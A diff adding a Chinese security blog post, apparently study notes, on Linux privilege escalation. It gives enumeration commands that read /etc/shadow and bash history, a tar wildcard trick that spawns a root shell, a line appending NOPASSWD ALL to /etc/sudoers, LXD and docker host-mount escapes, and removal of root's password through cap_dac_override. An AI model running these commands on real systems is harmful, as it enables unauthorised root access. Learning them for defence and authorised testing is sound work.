@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar-1080x1080.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar-1080x1080.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar-1080x1080.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"l1nk.icu","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Linux Privilege Escalation">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux 提权">
+<meta property="og:url" content="http://l1nk.icu/2025/08/14/Linux%20%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="L1nk&#39;s Blog">
+<meta property="og:description" content="Linux Privilege Escalation">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-08-13T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-13T16:00:00.000Z">
+<meta property="article:author" content="l1nk">
+<meta property="article:tag" content="blog">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://l1nk.icu/2025/08/14/Linux%20%E6%8F%90%E6%9D%83/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://l1nk.icu/2025/08/14/Linux%20%E6%8F%90%E6%9D%83/","path":"2025/08/14/Linux 提权/","title":"Linux 提权"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Linux 提权 | L1nk's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">L1nk's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%8B%E5%8A%A8%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.1.</span> <span class="nav-text">手动枚举</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#examples"><span class="nav-number">2.</span> <span class="nav-text">examples</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Wildcard-Abuse"><span class="nav-number">2.1.</span> <span class="nav-text">Wildcard Abuse</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Escaping-Restricted-Shells"><span class="nav-number">2.2.</span> <span class="nav-text">Escaping Restricted Shells</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%9D%83%E7%BB%84"><span class="nav-number">2.3.</span> <span class="nav-text">特权组</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#LXC-LXD"><span class="nav-number">2.3.1.</span> <span class="nav-text">LXC&#x2F;LXD</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#docker"><span class="nav-number">2.3.2.</span> <span class="nav-text">docker</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#disk"><span class="nav-number">2.3.3.</span> <span class="nav-text">disk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#adm"><span class="nav-number">2.3.4.</span> <span class="nav-text">adm</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Capabilities"><span class="nav-number">2.4.</span> <span class="nav-text">Capabilities</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cron"><span class="nav-number">2.5.</span> <span class="nav-text">Cron</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Docker"><span class="nav-number">2.6.</span> <span class="nav-text">Docker</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Shared-Directories-volume-mounts"><span class="nav-number">2.6.1.</span> <span class="nav-text">Shared Directories(volume mounts)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Docker-Socket"><span class="nav-number">2.6.2.</span> <span class="nav-text">Docker Socket</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#k8s"><span class="nav-number">2.7.</span> <span class="nav-text">k8s</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Logrotate"><span class="nav-number">2.8.</span> <span class="nav-text">Logrotate</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Others"><span class="nav-number">2.9.</span> <span class="nav-text">Others</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Screen"><span class="nav-number">2.9.1.</span> <span class="nav-text">Screen</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%B1-NFS-%E6%9D%83%E9%99%90"><span class="nav-number">2.9.2.</span> <span class="nav-text">弱 NFS 权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Tmux-Sessions-%E5%8A%AB%E6%8C%81"><span class="nav-number">2.9.3.</span> <span class="nav-text">Tmux Sessions 劫持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LD-PRELOAD-%E6%8F%90%E6%9D%83"><span class="nav-number">2.9.4.</span> <span class="nav-text">LD_PRELOAD 提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Shared-Object-%E5%8A%AB%E6%8C%81"><span class="nav-number">2.9.5.</span> <span class="nav-text">Shared Object 劫持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Python-%E5%BA%93%E5%8A%AB%E6%8C%81"><span class="nav-number">2.9.6.</span> <span class="nav-text">Python 库劫持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sudo"><span class="nav-number">2.9.7.</span> <span class="nav-text">sudo</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Polkit"><span class="nav-number">2.9.8.</span> <span class="nav-text">Polkit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Dirty-Pipe"><span class="nav-number">2.9.9.</span> <span class="nav-text">Dirty Pipe</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Netfilter"><span class="nav-number">2.9.10.</span> <span class="nav-text">Netfilter</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lynis"><span class="nav-number">2.10.</span> <span class="nav-text">lynis</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="l1nk"
+      src="/images/avatar-1080x1080.png">
+  <p class="site-author-name" itemprop="name">l1nk</p>
+  <div class="site-description" itemprop="description">Vidar-Team Web | Student</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kn1l" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kn1l" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:l1nk@foxmail.com" title="E-Mail → mailto:l1nk@foxmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/l1nkowo" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;l1nkowo" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://l1nk.icu/2025/08/14/Linux%20%E6%8F%90%E6%9D%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar-1080x1080.png">
+      <meta itemprop="name" content="l1nk">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L1nk's Blog">
+      <meta itemprop="description" content="Vidar-Team Web | Student">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Linux 提权 | L1nk's Blog">
+      <meta itemprop="description" content="Linux Privilege Escalation">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Linux 提权
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-08-14 00:00:00" itemprop="dateCreated datePublished" datetime="2025-08-14T00:00:00+08:00">2025-08-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-08-14 00:00:00" itemprop="dateModified" datetime="2024-08-14T00:00:00+08:00">2024-08-14</time>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>3.6k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>13 mins.</span>
+    </span>
+</div>
+
+            <div class="post-description">Linux Privilege Escalation</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>自动：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng">peass-ng&#x2F;PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)</a></p>
+<p>可能存在可被用于提权的信息的查询方式</p>
+<h3 id="手动枚举"><a href="#手动枚举" class="headerlink" title="手动枚举"></a>手动枚举</h3><blockquote>
+<p>匠人精神这一块</p>
+</blockquote>
+<p>Checklist</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 操作系统版本</span></span><br><span class="line"><span class="built_in">cat</span> /etc/os-release</span><br><span class="line"><span class="built_in">cat</span> /etc/lsb-release</span><br><span class="line"><span class="comment"># 内核版本</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># cpu</span></span><br><span class="line">lscpu</span><br><span class="line"><span class="comment"># 主机名</span></span><br><span class="line">hostname</span><br><span class="line"><span class="comment"># 未挂载的文件系统/额外的磁盘</span></span><br><span class="line">lsblk</span><br><span class="line"><span class="comment"># 挂载信息</span></span><br><span class="line"><span class="built_in">df</span> -h</span><br><span class="line">mount</span><br><span class="line"><span class="comment"># 环境变量</span></span><br><span class="line"><span class="built_in">env</span></span><br><span class="line"><span class="comment"># 当前用户</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line"><span class="comment"># 登录的用户</span></span><br><span class="line">w</span><br><span class="line">last</span><br><span class="line">lastlog</span><br><span class="line"><span class="comment"># 列出组</span></span><br><span class="line">getent group</span><br><span class="line"><span class="built_in">cat</span> /etc/group</span><br><span class="line"><span class="comment"># 可读的/etc/shadow</span></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br><span class="line"><span class="comment"># /etc/passwd</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line"><span class="comment"># sudo 权限</span></span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">cat</span> /etc/sudoers</span><br><span class="line">getent group <span class="built_in">sudo</span></span><br><span class="line"><span class="comment"># SUID</span></span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"><span class="comment"># SGID</span></span><br><span class="line">find / -user root -perm -2000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 枚举 Capabilities</span></span><br><span class="line">find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -<span class="built_in">type</span> f -<span class="built_in">exec</span> <span class="built_in">getcap</span> &#123;&#125; \;</span><br><span class="line"><span class="comment"># 查找可写目录</span></span><br><span class="line">find / -path /proc -prune -o -<span class="built_in">type</span> d -perm -o+w 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 查找 world-writable 的文件</span></span><br><span class="line">find / -path /proc -prune -o -<span class="built_in">type</span> f -perm -o+w 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 安装的包和版本</span></span><br><span class="line">apt list --installed | <span class="built_in">tr</span> <span class="string">&quot;/&quot;</span> <span class="string">&quot; &quot;</span> | <span class="built_in">cut</span> -d<span class="string">&quot; &quot;</span> -f1,3 | sed <span class="string">&#x27;s/[0-9]://g&#x27;</span> | <span class="built_in">tee</span> -a installed_pkgs.list</span><br><span class="line"><span class="comment"># 运行的进程</span></span><br><span class="line">ps aux</span><br><span class="line"><span class="comment"># cron</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># network</span></span><br><span class="line"><span class="comment">## 路由、监听的端口、interfaces...</span></span><br><span class="line">route</span><br><span class="line">netstat -rn</span><br><span class="line">ifconfig</span><br><span class="line">ip a</span><br><span class="line">arp -a</span><br><span class="line"><span class="built_in">cat</span> /etc/hosts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 寻找凭证泄露</span></span><br><span class="line"><span class="comment"># 历史命令</span></span><br><span class="line"><span class="built_in">cat</span> .bash_history</span><br><span class="line"><span class="built_in">history</span></span><br><span class="line"><span class="comment"># 其余可关注的信息</span></span><br><span class="line"><span class="comment"># home 目录</span></span><br><span class="line"><span class="comment"># 用户的 home 目录</span></span><br><span class="line"><span class="comment"># .ssh</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;etc&#x2F;passwd 中密码 hash 值的算法</p>
+<table>
+<thead>
+<tr>
+<th><strong>Algorithm</strong></th>
+<th><strong>Hash</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Salted MD5</td>
+<td><code>$1$</code>…</td>
+</tr>
+<tr>
+<td>SHA-256</td>
+<td><code>$5$</code>…</td>
+</tr>
+<tr>
+<td>SHA-512</td>
+<td><code>$6$</code>…</td>
+</tr>
+<tr>
+<td>BCrypt</td>
+<td><code>$2a$</code>…</td>
+</tr>
+<tr>
+<td>Scrypt</td>
+<td><code>$7$</code>…</td>
+</tr>
+<tr>
+<td>Argon2</td>
+<td><code>$argon2i$</code>…</td>
+</tr>
+</tbody></table>
+<p>一些思路：</p>
+<ul>
+<li>文件中的凭证泄露（登录其他用户、主机、服务）</li>
+<li>SUID&#x2F;GUID&#x2F;sudo&#x2F;Capabilities&#x2F;Cron…配置问题</li>
+<li>利用高权限运行中的服务的漏洞</li>
+<li>劫持高权限运行的应用</li>
+<li>二进制程序漏洞</li>
+<li>内核漏洞</li>
+</ul>
+<h2 id="examples"><a href="#examples" class="headerlink" title="examples"></a>examples</h2><h3 id="Wildcard-Abuse"><a href="#Wildcard-Abuse" class="headerlink" title="Wildcard Abuse"></a>Wildcard Abuse</h3><p>情景：在 sudo&#x2F;cron 等有高权限执行的命令中包含 <code>*</code> 等通配符</p>
+<p>原理：shell 在执行命令前会先处理通配符，将通配符展开，再构建最终命令</p>
+<p>防护：避免使用 <code>*</code> 等通配符；使用 <code>--</code> 分隔符</p>
+<p>假如 <code>sudo -l</code> 显示 <code>(root) /bin/tar -czf /backups/user_backup.tar *</code></p>
+<p>利用方式：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入一个可写文件夹</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="comment"># 创建文件</span></span><br><span class="line"><span class="built_in">touch</span> -- <span class="string">&quot;--checkpoint=1&quot;</span></span><br><span class="line"><span class="built_in">touch</span> -- <span class="string">&quot;--checkpoint-action=exec=bash&quot;</span></span><br><span class="line"><span class="built_in">touch</span> tmp <span class="comment"># tar 需要至少存在一个文件</span></span><br><span class="line"><span class="comment"># 执行命令</span></span><br><span class="line"><span class="built_in">sudo</span> /bin/tar -czf /backups/user_backup.tar *</span><br></pre></td></tr></table></figure>
+
+<p>也可以执行脚本</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;echo &quot;your-username ALL=(root) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span> &gt; root.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; <span class="string">&quot;--checkpoint-action=exec=sh root.sh&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; --checkpoint=1</span><br></pre></td></tr></table></figure>
+
+<h3 id="Escaping-Restricted-Shells"><a href="#Escaping-Restricted-Shells" class="headerlink" title="Escaping Restricted Shells"></a>Escaping Restricted Shells</h3><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://0xffsec.com/handbook/shells/restricted-shells/">https://0xffsec.com/handbook/shells/restricted-shells/</a></p>
+<ul>
+<li>命令注入</li>
+</ul>
+<p>shell 允许 <code>ls -l</code> 但不允许其他命令</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l `<span class="built_in">touch</span> success` </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>命令替换：shell 允许使用反引号，<code>$()</code> 进行命令替换，可以直接执行命令</li>
+<li>命令链式调用：用 <code>;</code>，<code>|</code> 等分割执行命令</li>
+<li>环境变量</li>
+<li>shell 函数</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取环境变量</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="comment"># 列出当前目录文件，类似于ls</span></span><br><span class="line"><span class="built_in">echo</span> *</span><br><span class="line"><span class="comment"># 读取文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(&lt;flag.txt)</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;`&lt;flag.txt`&quot;</span></span><br><span class="line">man -C flag.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出环境变量</span></span><br><span class="line"><span class="built_in">export</span> -p</span><br></pre></td></tr></table></figure>
+
+<h3 id="特权组"><a href="#特权组" class="headerlink" title="特权组"></a>特权组</h3><h4 id="LXC-LXD"><a href="#LXC-LXD" class="headerlink" title="LXC&#x2F;LXD"></a>LXC&#x2F;LXD</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解压镜像</span></span><br><span class="line">unzip alpine.zip</span><br><span class="line"><span class="comment"># 初始化LXD，默认选项即可</span></span><br><span class="line">lxd init</span><br><span class="line"><span class="comment"># 导入镜像</span></span><br><span class="line">lxc image import alpine.tar.gz alpine.tar.gz.root --<span class="built_in">alias</span> alpine</span><br><span class="line"><span class="comment"># 启动特权容器，使容器中的root和主机中的root用户相同</span></span><br><span class="line">lxc init alpine r00t -c security.privileged=<span class="literal">true</span></span><br><span class="line"><span class="comment"># 挂载主机文件系统</span></span><br><span class="line">lxc config device add r00t mydev disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line"><span class="comment"># 启动容器</span></span><br><span class="line">lxc start r00t</span><br><span class="line"><span class="comment"># 在容器中启动shell</span></span><br><span class="line">lxc <span class="built_in">exec</span> r00t /bin/sh</span><br></pre></td></tr></table></figure>
+
+<h4 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/hostsystem -it ubuntu</span><br></pre></td></tr></table></figure>
+
+<h4 id="disk"><a href="#disk" class="headerlink" title="disk"></a>disk</h4><p>有 <code>/dev</code> 中包含的任何设备的完全访问权限</p>
+<p>可以使用 <code>debugfs</code> 以 root 权限访问整个文件系统</p>
+<h4 id="adm"><a href="#adm" class="headerlink" title="adm"></a>adm</h4><p>能够读取 <code>/var/log</code> 中的所有日志，无法直接提权，可用于收集日志文件中的敏感数据</p>
+<h3 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h3><p>授权对象是进程，使进程在运行时有对应特权</p>
+<p>一些 Capabilities：</p>
+<ul>
+<li><code>cap_sys_admin</code><ul>
+<li>允许使用管理员权限执行操作，比如修改系统文件或者修改系统设置</li>
+</ul>
+</li>
+<li><code>cap_sys_chroot</code><ul>
+<li>运行更改当前进程的根目录，使其能够访问原本无法访问的文件和目录</li>
+</ul>
+</li>
+<li><code>cap_sys_ptrace</code><ul>
+<li>允许调试其他进程为</li>
+</ul>
+</li>
+<li><code>cap_sys_nice</code><ul>
+<li>允许提高或降低进程优先级</li>
+</ul>
+</li>
+<li><code>cap_sys_time</code><ul>
+<li>允许修改系统时间</li>
+</ul>
+</li>
+<li><code>cap_sys_resource</code><ul>
+<li>允许修改系统资源限制，例如打开 fd 数量或可以分配最大内存量</li>
+</ul>
+</li>
+<li><code>cap_sys_module</code><ul>
+<li>允许加载和卸载内核模块</li>
+</ul>
+</li>
+<li><code>cap_net_bind_service</code><ul>
+<li>允许绑定到网络端口<br>可用于提权的 Capabilities:</li>
+</ul>
+</li>
+<li><code>cap_setuid</code><ul>
+<li>允许一个进程设置其有效的 uid，从而可以获取另一个用户的权限</li>
+</ul>
+</li>
+<li><code>cap_setgid</code><ul>
+<li>允许设置其有效 gid，从而获取另一个组的权限</li>
+</ul>
+</li>
+<li><code>cap_sys_admin</code><ul>
+<li>拥有广泛的管理权限，包括对 root 用户保留的许多操作能力，比如修改系统设置等</li>
+</ul>
+</li>
+<li><code>cap_dac_override</code><ul>
+<li>允许绕过文件的读取、写入和执行权限检查</li>
+</ul>
+</li>
+</ul>
+<p>cap_dac_override 修改&#x2F;etc&#x2F;passwd 提权 (除了移除 root 密码，还可以创建一个新 root，或者将当前用户 uid 改为 0 等提权方式)</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设vim.basic 存在cap_dac_override</span></span><br><span class="line">$ <span class="built_in">getcap</span> /usr/bin/vim.basic</span><br><span class="line">/usr/bin/vim.basic cap_dac_override=eip</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> /etc/passwd | <span class="built_in">head</span> -n1</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改/etc/passwd</span></span><br><span class="line">$ /usr/bin/vim.basic /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去除x，使root无需密码登录</span></span><br><span class="line">$ <span class="built_in">cat</span> /etc/passwd | <span class="built_in">head</span> -n1</span><br><span class="line">root::0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 无需密码登录root</span></span><br><span class="line">$ su</span><br></pre></td></tr></table></figure>
+
